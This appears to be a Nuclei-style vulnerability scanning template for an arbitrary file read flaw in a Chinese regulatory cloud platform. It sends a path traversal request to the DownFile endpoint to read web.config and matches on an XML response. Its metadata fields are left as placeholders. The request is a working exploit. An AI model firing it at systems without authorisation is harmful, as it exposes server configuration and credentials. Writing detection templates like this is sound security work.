id: zhjgpt-DownFile-fileread

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 综合监管云平台 DownFile 任意文件读取漏洞
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |+
        GET /Download/DownFile?fileName=../web.config HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: word
        part: body
        words:
          - '<?xml'
